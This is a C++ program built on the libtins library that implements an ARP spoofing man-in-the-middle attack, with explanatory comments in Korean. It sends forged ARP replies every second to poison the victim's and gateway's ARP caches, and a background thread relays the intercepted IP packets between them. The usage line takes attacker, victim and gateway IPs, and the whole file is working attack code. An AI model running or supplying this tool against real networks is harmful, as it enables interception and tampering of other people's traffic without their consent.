#include <iostream>
#include <stdexcept>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>
#include <tins/tins.h>

#define	ETHERTYPE_IP		0x0800

using namespace Tins;
using namespace std;
using std::runtime_error;

char *dev;
int mode;
IPv4Address Attack,Victim,Gate;
EthernetII::address_type own_hw;
NetworkInterface iface;
NetworkInterface::Info info;
in_addr_t *Attacker_Hex_Ip, *Victim_Hex_Ip, *Gateway_Hex_IP;
EthernetII::address_type gw_hw, victim_hw; // hardware mac addr var
pthread_t Relay_handle;

void *ARP_Relay(void*)
{
    PacketSender Relay_Sender;
    SnifferConfiguration config;
    config.set_immediate_mode(true);
    Sniffer sniffer(dev,config);
    
    
    while(1)
    {
        PDU *pkt = sniffer.next_packet();
        EthernetII *eth = pkt->find_pdu<EthernetII>();

        if(eth->payload_type() == ETHERTYPE_IP)
        {
            if(eth->dst_addr() == info.hw_addr)
            {
                if(eth->src_addr() == victim_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(gw_hw);
                    pkt->send(Relay_Sender,dev);                       
                }

                if(eth->src_addr() == gw_hw)
                {
                    eth->src_addr(info.hw_addr);
                    eth->dst_addr(victim_hw);
                    pkt->send(Relay_Sender,dev);
                }
            }
        }
    }
}

void arp_spoofing(NetworkInterface Interface_device, IPv4Address gw, IPv4Address victim, const NetworkInterface::Info& info)
{

    PacketSender sender;

    gw_hw = Utils::resolve_hwaddr(Interface_device, gw, sender); // gateway mac addr
    victim_hw = Utils::resolve_hwaddr(Interface_device, victim, sender); // victim mac addr

    cout << "Using gateway hw address: " << gw_hw << "\n";
    cout << "Using victim hw address:  " << victim_hw << "\n";
    cout << "Using own hw address:     " << info.hw_addr << "\n";


     /* 우리는 게이트웨이에 피해자가 외신 주소라고 말했지만,
          그리고 희생자에게 게이트 웨이가 hw 주소에 있음을 알림*/

    //ARP라는 객체를 만든다. ARP 요청 및 응답은 ARP :: make_arp_requ림est / reply 정적 멤버 함수를 사용하여 쉽게 구성 할 수 있음.
     // 타겟 아이피, 보내는 아이피, 타겟 하드웨어 주소, 보내는 하드웨어 주소.

    ARP gw_arp(gw, victim, gw_hw, info.hw_addr), //info.hw_addr My Mac addr
            victim_arp(victim, gw, victim_hw, info.hw_addr); // info.hw_addr My Mac addr

    gw_arp.opcode(ARP::REPLY); // gateway_arp_opcode -> REPLY
    victim_arp.opcode(ARP::REPLY); // victim_arp_opcode -> REPLY


     /* 게이트웨이와 피해자에게 보낼 패킷.
             * 우리는 hw 주소를 소스 주소로 포함시킴.
             * 이더넷 계층에서 패킷 손실 가능성을 피하기 위해
             * 모든 라우터에서 수행. */

    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;

    pthread_create(&Relay_handle,NULL,&ARP_Relay,NULL);

    while (true)
    {
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(1);

    }//while문으로 계속 감염만 시키고 Relay는 해주지않음. 감염 시켜주는 패킷은 1초마다 보낸다.
}

int main(int argc, char* argv[])
{
    //error argc
    if (argc != 5)
    {
        cout << "Error!!\n";
        cout << "./[FileName] [Interface_Device] [Attacker IP] [Victim IP] [GateWay IP]"<<endl;
        return 1; //argv 인자값이 오류일때.
    }
    //argv[0] = 파일 이름, argv[1] = 인터페이스 , argv[2] = Attacker IP, argv[3] = Victim IP, argv[4] = GateWay IP
    dev = argv[1]; // 인터페이스 장치 이름을 dev 변수에 저장.
    cout << "Mode Input\n";
    cout << "1. Start\n";
    cout << "Input: ";      // ARP 스푸핑 모드를 입력.
    scanf("%d",&mode);

    try
    {
        Attack = argv[2];   // Attack 변수에 Attacker의 IP 초기화
        Victim = argv[3];   // Victim 변수에 Victim의 IP초기화
        Gate = argv[4];     // Gate 변수에 Gate의 IP 초기화
    }

    catch (...)
    {
        cout << "Invalid ip found...\n";
        return 2; // argv 인자값을 변수에 넣을때의 오류
    }

    try
    {
        iface = Gate; // 요청에 대한 게이트웨이가 될 인터페이스를 가져옵니다.
        info = iface.addresses(); // 내 하드웨어 주소를 info라는 NetworkInferface 구조체 변수에 넣는다.
    }

    catch (runtime_error& ex)
    {
        cout << ex.what() << endl;
        return 3;
    }

    if(mode == 1)
    {
    retry:
        try
        {
            arp_spoofing(iface, Gate, Victim, info);
        }

        catch (runtime_error& ex)
        {
            goto retry;
        }
    }
    else if(mode != 1)
    {
        cout << "Error\n";
        return 4;
    }
}
